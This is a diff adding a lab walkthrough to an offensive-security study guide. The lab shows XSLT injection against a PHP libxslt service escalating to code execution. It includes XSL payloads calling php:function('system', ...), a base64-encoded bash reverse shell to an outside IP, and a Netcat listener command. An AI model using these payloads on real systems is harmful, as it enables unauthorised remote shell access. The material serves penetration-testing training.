@@ -991,8 +991,6 @@ When responding to XSL:INCLUDE directives, you might also try to respond with XM
 
 
 
-
-
 ----
 
 ## Labs
@@ -1173,4 +1171,115 @@ sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
     -e "s/-----END RSA PRIVATE KEY-----/\n&/" \
     -e "s/\S\{64\}/&\n/g" \
     id_rsa > fixed_id_rsa
+```
+
+
+
+
+
+
+
+### Lab2: XSLT to Code Execution
+
+
+
+An **Online Transformation Service** application is provided. It expects an XML and an XSL file to be uploaded by the user. After both the files are uploaded, the XML file is transformed according to the instructions in the XSL file.
+
+**Information:** XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.
+
+**Reference:** https://www.w3schools.com/xml/xsl_intro.asp
+
+Save a test XML file and an XSL file to detect the backend XSLT engine information.
+
+Save the following content as **test.xml**:
+
+**test.xml:**
+
+```xml
+<?xml version="1.0"?>
+<root>Hello, World!</root>
+```
+
+
+
+Save the following content as **test.xsl**:
+
+**test.xsl:**
+
+```xml
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:output method="html"/>
+    <xsl:template match="/">
+    <h2>XSLT Engine Info:</h2>
+    <b>Version:</b><xsl:value-of select="system-property('xsl:version')" /><br/>
+    <b>Vendor:</b><xsl:value-of select="system-property('xsl:vendor')" /><br/>
+    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+Notice the contents of the XSL file. It contains the **xsl** tags to pull the information about the XSLT engine used by the backend:
+
+- xsl:version
+- xsl:vendor
+- xsl:vendor-URL
+
+
+
+By now, we have understood that the backend is running PHP and using the **libxslt** processor. Also, the processor parses the user-supplied files without any sanitization, as far as we have used it.
+
+Now we will try to execute PHP functions from the XSL file. This will only work if **registerPHPFunctions** is enabled for the XSLT processor, as shown in the following post: https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls
+
+
+
+**test.xsl:**
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
+version="1.0">
+<!-- We add the PHP's xmlns -->
+    <xsl:template match="/">
+        <html>
+            <!-- We use the php suffix to call the functions -->
+            <xsl:value-of select="php:function('system','uname -a')" />
+            <!-- Output: 'Php Can Now Be Used In Xsl' -->
+        </html>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+Notice that we have specified the **uname -a** command to be executed via the PHP **system** function.
+
+If the backend XSLT processing code has registered PHP functions, then the above code would run, and we will see the output of the **uname -a** command on the resulting page.
+
+Next, we will base64-encode the reverse shell payload to avoid it being tampered with while uploading over HTTP:
+
+```
+echo "/bin/bash -c 'bash -i>& /dev/tcp/192.170.91.2/54321 0>&1'" | base64 -w0 ; echo
+```
+
+**Note:** Make sure to replace the IP address in the above command.
+
+Add the reverse shell payload in the XSL file:
+
+**test.xsl:**
+
+```xml
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
+version="1.0">
+<!-- We add the PHP's xmlns -->
+    <xsl:template match="/">
+        <html>
+            <!-- We use the php suffix to call the functions -->
+            <xsl:value-of select="php:function('system','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash')" />
+            <!-- Output: 'Php Can Now Be Used In Xsl' -->
+        </html>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+Start a Netcat listener on the attacker machine:
+
+```
+nc -lvp 54321
 ```
